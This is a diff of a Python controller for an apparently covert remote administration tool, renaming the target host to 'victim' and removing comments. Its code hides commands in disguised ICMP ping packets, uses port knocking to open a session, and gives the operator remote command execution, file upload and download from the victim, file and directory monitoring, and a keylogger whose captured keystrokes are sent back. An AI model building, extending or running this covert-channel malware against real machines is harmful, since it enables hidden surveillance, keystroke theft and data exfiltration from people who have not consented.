@@ -1,9 +1,3 @@
-"""hosta: control center for the remote administration tool.
-
-Usage:
-    sudo python3 hosta.py -a <hostb_ip>
-"""
-
 import argparse
 import hashlib
 import os
@@ -23,9 +17,6 @@ TTL = 64
 ACK_TIMEOUT_SECONDS = 5.0
 TCP_SYN_FLAG = 0x02
 
-# Command-channel protocol: command code goes in the ICMP identifier
-# (16 bits, XOR-encrypted with the user-supplied pre-shared key derived
-# via SHA-256); sequence in the ICMP sequence field in cleartext.
 CMD_DISCONNECT = 1
 CMD_TRANSFER_FILE = 2
 CMD_UNINSTALL = 3
@@ -41,36 +32,27 @@ ACK_CHUNK = 0xFFFC
 ACK_END = 0xFFFB
 WATCH_STOP = 0xFFF7
 
-# Run-program limits.
-MAX_COMMAND_BYTES = 0xFFFFFFFF               # command bytes use 32-bit size header
-OUTPUT_TIMEOUT_SECONDS = 60.0                # wait this long for output metadata
+MAX_COMMAND_BYTES = 0xFFFFFFFF              
+OUTPUT_TIMEOUT_SECONDS = 60.0             
 
-# File transfer: chunked stop-and-wait protocol.
-# Each chunk = CHUNK_PACKETS data packets carrying 2 bytes each.
-# Hosta sends a chunk header (seq=CHUNK_HEADER_SEQ, identifier=chunk_index)
-# followed by data packets (seq=1..CHUNK_PACKETS, identifier=2 data bytes).
-# Hostb ACKs each chunk; hosta retries up to MAX_CHUNK_RETRIES on timeout.
-MAX_TRANSFER_BYTES = 0xFFFFFFFF              # 32-bit file size split across 2 metadata packets
-MAX_FILENAME_BYTES = 0xFFFF                  # filename length still fits one 16-bit identifier
+MAX_TRANSFER_BYTES = 0xFFFFFFFF             
+MAX_FILENAME_BYTES = 0xFFFF               
 CHUNK_PACKETS = 1024
 CHUNK_BYTES = CHUNK_PACKETS * 2
-CHUNK_PACKET_DELAY_SECONDS = 0.0001       # 100us pacing inside a chunk
-RECV_BUFFER_BYTES = 8 * 1024 * 1024       # ask kernel for big recv buffer
+CHUNK_PACKET_DELAY_SECONDS = 0.0001     
+RECV_BUFFER_BYTES = 8 * 1024 * 1024     
 READY_TIMEOUT_SECONDS = 5.0
 META_ACK_TIMEOUT_SECONDS = 5.0
 CHUNK_ACK_TIMEOUT_SECONDS = 5.0
-CHUNK_RECV_TIMEOUT_SECONDS = 10.0            # per-attempt timeout receiving a chunk
+CHUNK_RECV_TIMEOUT_SECONDS = 10.0          
 END_ACK_TIMEOUT_SECONDS = 3.0
 END_DRAIN_TIMEOUT_SECONDS = 3.0
 MAX_CHUNK_RETRIES = 5
 
-# File request: hostb reads file and streams back. Allow more time than command
-# output because hostb might have to read a multi-MB file from disk first.
 REQUESTED_FILE_TIMEOUT_SECONDS = 60.0
 RECEIVED_DIRECTORY = "received"
 RECEIVED_FALLBACK_NAME = "received_file"
 
-# Reserved sequence values for the transfer protocol.
 CHUNK_HEADER_SEQ = 0
 END_SEQ = 0xFFFF
 META_FILENAME_LENGTH_SEQ = 1
@@ -78,13 +60,9 @@ META_FILE_SIZE_HI_SEQ = 2
 META_FILE_SIZE_LO_SEQ = 3
 META_FILENAME_FIRST_SEQ = 4
 
-# Byte-stream metadata (run-program command and output): just the 32-bit size.
 STREAM_SIZE_HI_SEQ = 1
 STREAM_SIZE_LO_SEQ = 2
 
-# Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
-# 0x10..0x3F filler pattern. hostb ignores this payload — it only reads
-# the identifier and sequence header fields.
 PING_PAYLOAD = b"\x00" * 8 + bytes(range(0x10, 0x40))
 
 MENU_OPTIONS = (
@@ -102,14 +80,14 @@ MENU_OPTIONS = (
 
 
 @dataclass
-class HostaArgs:
-    hostb_ip: str
+class ControllerArgs:
+    victim_ip: str
     key: str
 
 
 @dataclass
 class Context:
-    args: HostaArgs | None = None
+    args: ControllerArgs | None = None
     error_message: str | None = None
     error_code: int = 1
     destination_ip: str = ""
@@ -118,9 +96,8 @@ class Context:
     key: int = 0
 
 
-# ---------------------------------------------------------------------------
 # Protocol helpers
-# ---------------------------------------------------------------------------
+
 
 def detect_source_ip(destination_ip):
     probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -145,11 +122,11 @@ def build_ip_header(source_ip, destination_ip, total_length, protocol=socket.IPP
     def with_checksum(checksum):
         return struct.pack(
             "!BBHHHBBH4s4s",
-            0x45,                     # version 4, header length 5 (20 bytes)
-            0,                        # type of service
+            0x45,                     
+            0,                      
             total_length,
-            0,                        # identification
-            0,                        # flags + fragment offset
+            0,                        
+            0,                      
             TTL,
             protocol,
             checksum,
@@ -165,13 +142,13 @@ def build_tcp_syn_header(source_ip, destination_ip, destination_port):
             "!HHLLBBHHH",
             SOURCE_PORT,
             destination_port,
-            0,                        # sequence number
-            0,                        # ack number
-            0x50,                     # data offset 5 (20 bytes), reserved 0
-            0x02,                     # flags: SYN only
-            65535,                    # window
+            0,                     
+            0,                        
+            0x50,                   
+            0x02,                   
+            65535,                  
             checksum,
-            0,                        # urgent pointer
+            0,                      
         )
     pseudo = struct.pack(
         "!4s4sBBH",
@@ -179,7 +156,7 @@ def build_tcp_syn_header(source_ip, destination_ip, destination_port):
         socket.inet_aton(destination_ip),
         0,
         socket.IPPROTO_TCP,
-        20,                           # TCP header length
+        20,                          
     )
     return with_checksum(compute_checksum(pseudo + with_checksum(0)))
 
@@ -188,8 +165,8 @@ def build_icmp_echo_request(identifier_encrypted, sequence):
     def with_checksum(checksum):
         header = struct.pack(
             "!BBHHH",
-            8,                         # type: echo request
-            0,                         # code
+            8,                       
+            0,                    
             checksum,
             identifier_encrypted,
             sequence,
@@ -360,7 +337,7 @@ def send_ack(send_socket, source_ip, destination_ip, key, identifier_sentinel, s
 def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
                   expected_chunk_index, expected_packets, chunks_written, timeout):
     """Collect one chunk's data packets. Returns (bytes, None) on success or
-    (None, missing_count) on timeout. Mirrors hostb.receive_chunk."""
+    (None, missing_count) on timeout. Mirrors victim.receive_chunk."""
     packets: dict[int, int] = {}
     saw_header = False
     deadline = time.time() + timeout
@@ -523,9 +500,8 @@ def receive_byte_stream_chunked(recv_socket, send_socket, my_ip, peer_ip, key, m
     return bytes(output)
 
 
-# ---------------------------------------------------------------------------
-# FSM state functions
-# ---------------------------------------------------------------------------
+# State functions
+
 
 def handle_error(ctx: Context):
     sys.stderr.write(f"\nError: {ctx.error_message}\n")
@@ -535,34 +511,34 @@ def handle_error(ctx: Context):
 
 def parse_arguments(ctx: Context, argv: list[str] | None = None):
     parser = argparse.ArgumentParser(
-        prog="hosta",
+        prog="controller",
         description="Control center for the remote administration tool.",
     )
-    parser.add_argument("-a", "--address", dest="hostb_ip", required=True,
-                        metavar="<hostb_ip>",
-                        help="IP address of hostb")
+    parser.add_argument("-a", "--address", dest="victim_ip", required=True,
+                        metavar="<victim_ip>",
+                        help="IP address of victim")
     parser.add_argument("-k", "--key", dest="key", required=True,
                         metavar="<key>",
-                        help="pre-shared key string (must match hostb)")
+                        help="pre-shared key string (must match victim)")
 
     try:
         parsed = parser.parse_args(argv)
     except SystemExit as exc:
         sys.exit(1 if exc.code else 0)
 
-    ctx.args = HostaArgs(hostb_ip=parsed.hostb_ip, key=parsed.key)
+    ctx.args = ControllerArgs(victim_ip=parsed.victim_ip, key=parsed.key)
 
 
 def handle_arguments(ctx: Context):
     try:
-        socket.inet_aton(ctx.args.hostb_ip)
+        socket.inet_aton(ctx.args.victim_ip)
     except OSError:
-        ctx.error_message = f"invalid ip address: {ctx.args.hostb_ip}"
+        ctx.error_message = f"invalid ip address: {ctx.args.victim_ip}"
         handle_error(ctx)
     if not ctx.args.key:
         ctx.error_message = "key must be a non-empty string"
         handle_error(ctx)
-    ctx.destination_ip = ctx.args.hostb_ip
+    ctx.destination_ip = ctx.args.victim_ip
     ctx.key = derive_key(ctx.args.key)
 
 
@@ -585,8 +561,6 @@ def establish_session(ctx: Context):
 
     ctx.source_ip = detect_source_ip(ctx.destination_ip)
 
-    # Open the recv socket first so we don't miss an ack that arrives
-    # before we finish sending the knocks.
     try:
         recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         send_socket = open_raw_send_socket()
@@ -609,13 +583,13 @@ def establish_session(ctx: Context):
         while True:
             remaining = deadline - time.time()
             if remaining <= 0:
-                print("Connection failed: no ack from hostb.")
+                print("Connection failed: no ack from victim.")
                 return
             recv_socket.settimeout(remaining)
             try:
                 packet, _ = recv_socket.recvfrom(65535)
             except socket.timeout:
-                print("Connection failed: no ack from hostb.")
+                print("Connection failed: no ack from victim.")
                 return
 
             if len(packet) < 40:
@@ -669,7 +643,7 @@ def send_command(ctx: Context, command_code: int):
             print("Disconnect command sent.")
         elif command_code == CMD_UNINSTALL:
             ctx.connected = False
-            print("Uninstall command sent. hostb should now wipe its directory and exit.")
+            print("Uninstall command sent. Victim should now wipe its directory and exit.")
     finally:
         raw_socket.close()
 
@@ -722,7 +696,6 @@ def transfer_file(ctx: Context):
     print(f"  Name:     '{filename}' ({filename_length} bytes, {num_filename_packets} packets)")
     print(f"  Contents: {file_size} bytes in {total_chunks} chunks of up to {CHUNK_BYTES} bytes")
 
-    # Open the ICMP recv socket first so we don't miss any acks.
     try:
         recv_socket = open_raw_icmp_recv_socket()
         send_socket = open_raw_send_socket()
@@ -731,7 +704,6 @@ def transfer_file(ctx: Context):
         handle_error(ctx)
 
     try:
-        # Phase A: transfer request -> wait for ACK_READY.
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
@@ -745,11 +717,10 @@ def transfer_file(ctx: Context):
 
         if not wait_for_ack(recv_socket, ctx.destination_ip, ctx.key,
                             ACK_READY, None, READY_TIMEOUT_SECONDS):
-            print("Transfer failed: no ready ack from hostb.")
+            print("Transfer failed: no ready ack from victim.")
             return
-        print("hostb is ready. Sending metadata...")
+        print("Victim is ready. Sending metadata...")
 
-        # Phase B: metadata (filename length, file size hi/lo, filename bytes) -> ACK_META.
         file_size_hi = (file_size >> 16) & 0xFFFF
         file_size_lo = file_size & 0xFFFF
         try:
@@ -782,11 +753,10 @@ def transfer_file(ctx: Context):
 
         if not wait_for_ack(recv_socket, ctx.destination_ip, ctx.key,
                             ACK_META, None, META_ACK_TIMEOUT_SECONDS):
-            print("Transfer failed: no metadata ack from hostb.")
+            print("Transfer failed: no metadata ack from victim.")
             return
         print(f"Metadata acked. Sending {total_chunks} chunk(s)...")
 
-        # Phase C: stop-and-wait chunk loop.
         for chunk_index in range(total_chunks):
             chunk_start = chunk_index * CHUNK_BYTES
             chunk_data = file_bytes[chunk_start:chunk_start + CHUNK_BYTES]
@@ -813,7 +783,6 @@ def transfer_file(ctx: Context):
                 return
             print(f"  chunk {chunk_index + 1}/{total_chunks} acked ({len(chunk_data)} bytes)")
 
-        # Phase D: fire-and-forget END marker.
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
@@ -836,7 +805,7 @@ def request_file(ctx: Context):
         return
 
     try:
-        remote_path = input("hostb file path> ").strip()
+        remote_path = input("victim file path> ").strip()
     except (EOFError, KeyboardInterrupt):
         print()
         return
@@ -849,7 +818,7 @@ def request_file(ctx: Context):
         print(f"Request failed: path too long ({len(path_bytes)} bytes).")
         return
 
-    print(f"Requesting from hostb: {remote_path}")
+    print(f"Requesting from victim: {remote_path}")
 
     try:
         recv_socket = open_raw_icmp_recv_socket()
@@ -859,7 +828,6 @@ def request_file(ctx: Context):
         handle_error(ctx)
 
     try:
-        # Phase A: request -> wait for ACK_READY.
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
@@ -873,11 +841,10 @@ def request_file(ctx: Context):
 
         if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
                                   READY_TIMEOUT_SECONDS):
-            print("Request failed: no ready ack from hostb.")
+            print("Request failed: no ready ack from victim.")
             return
-        print("hostb is ready. Sending path...")
+        print("Victim is ready. Sending path...")
 
-        # Phase B: send the requested path as a byte stream.
         if not send_byte_stream_chunked(send_socket, recv_socket,
                                         ctx.source_ip, ctx.destination_ip,
                                         ctx.key, path_bytes):
@@ -885,7 +852,6 @@ def request_file(ctx: Context):
             return
         print("Path sent. Waiting for file...")
 
-        # Phase C: receive the file bytes.
         file_bytes = receive_byte_stream_chunked(
             recv_socket, send_socket, ctx.source_ip, ctx.destination_ip,
             ctx.key, REQUESTED_FILE_TIMEOUT_SECONDS,
@@ -894,7 +860,7 @@ def request_file(ctx: Context):
             print("Request failed: file receive aborted.")
             return
         if len(file_bytes) == 0:
-            print("Request failed: hostb reported the file is missing or unreadable.")
+            print("Request failed: Victim reported the file is missing or unreadable.")
             return
 
         basename = os.path.basename(remote_path.replace("\\", "/"))
@@ -917,15 +883,15 @@ def request_file(ctx: Context):
 
 def watch_item(ctx: Context, cmd: int):
     """Common handler for watch-file (CMD_WATCH_FILE) and watch-dir (CMD_WATCH_DIR).
-    Sends the path to hostb, then receives and prints inotify events live until
-    the user presses Enter or hostb signals done."""
+    Sends the path to victim, then receives and prints inotify events live until
+    the user presses Enter or victim signals done."""
     if not ctx.connected:
         print("Not connected. Use option 1 first.")
         return
 
     label = "file" if cmd == CMD_WATCH_FILE else "directory"
     try:
-        watch_path = input(f"hostb {label} path> ").strip()
+        watch_path = input(f"victim {label} path> ").strip()
     except (EOFError, KeyboardInterrupt):
         print()
         return
@@ -956,9 +922,9 @@ def watch_item(ctx: Context, cmd: int):
         print(f"Sent watch request. Waiting for ready ack...")
         if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
                                   READY_TIMEOUT_SECONDS):
-            print("Watch failed: no ready ack from hostb.")
+            print("Watch failed: no ready ack from victim.")
             return
-        print("hostb is ready. Sending path...")
+        print("Victim is ready. Sending path...")
 
         if not send_byte_stream_chunked(send_socket, recv_socket,
                                         ctx.source_ip, ctx.destination_ip,
@@ -995,7 +961,7 @@ def watch_item(ctx: Context, cmd: int):
                 value = decrypt_identifier(identifier, ctx.key)
 
                 if sequence == END_SEQ:
-                    print("\nhostb closed the watch session.")
+                    print("\nVictim closed the watch session.")
                     break
 
                 if sequence == 0:
@@ -1077,7 +1043,6 @@ def run_program(ctx: Context):
         handle_error(ctx)
 
     try:
-        # Phase A: run request -> wait for ACK_READY.
         try:
             send_icmp_identifier(
                 send_socket, ctx.source_ip, ctx.destination_ip,
@@ -1091,9 +1056,9 @@ def run_program(ctx: Context):
 
         if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
                                   READY_TIMEOUT_SECONDS):
-            print("Run failed: no ready ack from hostb.")
+            print("Run failed: no ready ack from victim.")
             return
-        print("hostb is ready. Sending command...")
+        print("Victim is ready. Sending command...")
 
         if not send_byte_stream_chunked(send_socket, recv_socket,
                                         ctx.source_ip, ctx.destination_ip,
@@ -1107,7 +1072,7 @@ def run_program(ctx: Context):
             ctx.key, OUTPUT_TIMEOUT_SECONDS,
         )
         if output_bytes is None:
-            print("Run failed: timed out or incomplete output from hostb.")
+            print("Run failed: timed out or incomplete output from victim.")
             return
 
         try:
@@ -1115,7 +1080,7 @@ def run_program(ctx: Context):
         except UnicodeDecodeError:
             output_text = output_bytes.decode("utf-8", errors="replace")
 
-        print(f"\n--- Output from hostb ({len(output_bytes)} bytes) ---")
+        print(f"\n--- Output from victim ({len(output_bytes)} bytes) ---")
         if output_text:
             print(output_text, end="" if output_text.endswith("\n") else "\n")
         print("--- End ---")
@@ -1141,22 +1106,22 @@ def start_key_logger(ctx: Context):
         send_icmp_identifier(send_socket, ctx.source_ip, ctx.destination_ip,
                              encrypt_identifier(CMD_RUN_KL, ctx.key), 1)
 
-        print("Waiting for keyboard list from hostb...")
+        print("Waiting for keyboard list from victim...")
 
         if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
-                                  READY_TIMEOUT_SECONDS):   # <-- Fixed here
-            print("No ready ack from hostb.")
+                                  READY_TIMEOUT_SECONDS):  
+            print("No ready ack from victim.")
             return
 
         device_list_bytes = receive_byte_stream_chunked(
             recv_socket, send_socket, ctx.source_ip, ctx.destination_ip,
-            ctx.key, READY_TIMEOUT_SECONDS   # Use existing constant
+            ctx.key, READY_TIMEOUT_SECONDS   
         )
         if device_list_bytes is None:
             print("Failed to receive device list.")
             return
 
-        print("\n=== Keyboards available on hostb ===")
+        print("\n=== Keyboards available on victim ===")
         print(device_list_bytes.decode("utf-8", errors="replace"))
         print("====================================")
 
@@ -1170,14 +1135,13 @@ def start_key_logger(ctx: Context):
             print()
             return
 
-        # Send selected device index back
         if not send_byte_stream_chunked(send_socket, recv_socket,
                                         ctx.source_ip, ctx.destination_ip,
                                         ctx.key, choice_bytes):
             print("Failed to send device choice.")
             return
 
-        print("✅ Key logger started on hostb.")
+        print("✅ Key logger started on victim.")
 
     finally:
         recv_socket.close()
@@ -1203,7 +1167,7 @@ def stop_key_logger(ctx: Context):
 
         if not wait_for_ack_ready(recv_socket, ctx.destination_ip, ctx.key,
                                   10):
-            print("No ready ack from hostb.")
+            print("No ready ack from victim.")
             return
 
         log_bytes = receive_byte_stream_chunked(
@@ -1231,7 +1195,7 @@ def stop_key_logger(ctx: Context):
 
 
 if __name__ == "__main__":
-    print("--------------- HOSTA ---------------")
+    print("--------------- CONTROLLER ---------------")
     ctx = Context()
     parse_arguments(ctx)
     handle_arguments(ctx)
